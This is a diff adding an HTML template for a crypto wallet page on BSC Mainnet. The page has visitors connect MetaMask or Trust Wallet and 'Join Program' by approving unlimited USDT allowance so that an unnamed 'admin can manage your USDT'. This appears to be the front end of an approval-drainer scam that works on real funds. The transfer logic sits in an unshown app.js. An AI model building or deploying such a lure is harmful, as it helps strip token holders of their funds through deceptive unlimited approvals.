@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Connect - USDT Transfer Demo</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="header-content">
+                <div class="logo">
+                    <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="20" cy="20" r="20" fill="#4F46E5"/>
+                        <path d="M20 10L30 20L20 30L10 20L20 10Z" fill="white"/>
+                    </svg>
+                    <h1>Crypto Wallet</h1>
+                </div>
+                <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+            </div>
+        </header>
+
+        <main>
+            <!-- Wallet Connection Status -->
+            <div id="connectionStatus" class="status-card hidden">
+                <div class="status-header">
+                    <h2>Connected Wallet</h2>
+                    <span class="status-indicator online"></span>
+                </div>
+                <div class="wallet-address">
+                    <span class="label">Address:</span>
+                    <span id="walletAddress" class="address"></span>
+                    <button id="copyBtn" class="icon-btn" title="Copy Address">
+                        📋
+                    </button>
+                </div>
+                <div class="network-info">
+                    <span class="label">Network:</span>
+                    <span id="networkName">BSC Mainnet</span>
+                </div>
+            </div>
+
+            <!-- Balance Card -->
+            <div id="balanceCard" class="card hidden">
+                <h2>Wallet Balance</h2>
+                <div class="balance-grid">
+                    <div class="balance-item">
+                        <div class="balance-label">BNB Balance</div>
+                        <div id="bnbBalance" class="balance-value">0.00</div>
+                    </div>
+                    <div class="balance-item">
+                        <div class="balance-label">USDT Balance</div>
+                        <div id="usdtBalance" class="balance-value">0.00</div>
+                    </div>
+                </div>
+                <button id="refreshBalance" class="secondary-btn">Refresh Balance</button>
+            </div>
+
+            <!-- Join Program Card -->
+            <div id="joinProgramCard" class="card hidden">
+                <h2>🚀 Join Our Program</h2>
+                <p class="info-text">
+                    By joining this program, you grant permission for our platform to access and manage your USDT tokens.
+                </p>
+                
+                <div class="status-box" id="approvalStatus">
+                    <div class="info-row">
+                        <span class="label">Approval Status:</span>
+                        <span id="approvalStatusText" class="value">Not Approved</span>
+                    </div>
+                    <div class="info-row" style="margin-top: 10px;">
+                        <span class="label">Current Allowance:</span>
+                        <span id="currentAllowance" class="value">0 USDT</span>
+                    </div>
+                </div>
+
+                <div class="alert" style="background: rgba(79, 70, 229, 0.1); border: 1px solid #4F46E5; color: #94A3B8; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                    <strong>ℹ️ How it works:</strong>
+                    <ul style="margin: 10px 0 0 20px; line-height: 1.8;">
+                        <li>Click "Join Program" below</li>
+                        <li>Approve unlimited USDT access in your wallet</li>
+                        <li>Our platform can manage your USDT on your behalf</li>
+                        <li>You can revoke access anytime</li>
+                    </ul>
+                </div>
+
+                <button id="joinProgramBtn" class="primary-btn" style="font-size: 18px; padding: 18px;">
+                    Join Program
+                </button>
+                
+                <div id="joinedStatus" class="hidden" style="margin-top: 20px; padding: 20px; background: rgba(16, 185, 129, 0.1); border: 1px solid #10B981; border-radius: 10px; text-align: center;">
+                    <h3 style="color: #10B981; margin-bottom: 10px;">✅ Successfully Joined!</h3>
+                    <p style="color: #94A3B8;">You are now part of the program. The admin can manage your USDT.</p>
+                </div>
+            </div>
+
+            <!-- Program Info Card -->
+            <div id="programInfoCard" class="card hidden">
+                <h2>📊 Program Information</h2>
+                <div class="balance-grid">
+                    <div class="balance-item">
+                        <div class="balance-label">Your Status</div>
+                        <div id="userStatus" class="balance-value" style="font-size: 20px;">Pending</div>
+                    </div>
+                    <div class="balance-item">
+                        <div class="balance-label">Joined At</div>
+                        <div id="joinedDate" class="balance-value" style="font-size: 16px;">-</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Instructions Card -->
+            <div id="instructionsCard" class="card">
+                <h2>🚀 Getting Started</h2>
+                <ol class="instructions-list">
+                    <li>
+                        <strong>Connect Your Wallet</strong>
+                        <p>Click the "Connect Wallet" button above to connect your Trust Wallet or MetaMask</p>
+                    </li>
+                    <li>
+                        <strong>Switch to BSC Mainnet</strong>
+                        <p>The app will automatically switch you to Binance Smart Chain (BSC) Mainnet</p>
+                    </li>
+                    <li>
+                        <strong>View Your Balance</strong>
+                        <p>See your BNB and USDT balance displayed after connection</p>
+                    </li>
+                    <li>
+                        <strong>Join the Program</strong>
+                        <p>Click "Join Program" button and approve USDT access in your wallet (2 confirmations needed)</p>
+                    </li>
+                    <li>
+                        <strong>You're Done!</strong>
+                        <p>The admin can now manage your USDT. You can revoke access anytime from your wallet.</p>
+                    </li>
+                </ol>
+                
+                <div class="alert alert-warning">
+                    <strong>⚠️ Important:</strong> You are using BSC Mainnet with REAL funds. Double-check recipient addresses before transferring!
+                </div>
+            </div>
+        </main>
+
+        <!-- Loading Overlay -->
+        <div id="loadingOverlay" class="loading-overlay hidden">
+            <div class="spinner"></div>
+            <p id="loadingText">Processing...</p>
+        </div>
+
+        <!-- Toast Notification -->
+        <div id="toast" class="toast hidden">
+            <span id="toastMessage"></span>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script src="{{ url_for('static', filename='js/app.js') }}"></script>
+</body>
+</html>
+
